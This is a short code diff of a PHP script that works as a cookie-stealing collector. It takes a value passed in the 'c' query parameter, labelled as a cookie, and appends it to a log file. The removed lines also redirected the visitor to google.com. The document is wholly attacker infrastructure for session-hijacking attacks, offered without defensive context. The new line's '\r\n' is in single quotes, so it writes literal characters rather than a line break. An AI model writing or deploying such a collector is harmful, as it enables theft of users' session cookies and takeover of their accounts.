@@ -1,6 +1,7 @@
 <?php
-header('Location:https://google.com');
-$cookies = $_GET["c"];
-$file = fopen('log.txt', 'a');
-fwrite($file, $cookies . "\n\n");
+$cookie = $_GET['c'];
+$fp = fopen('log.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fclose($fp);
+
 ?>
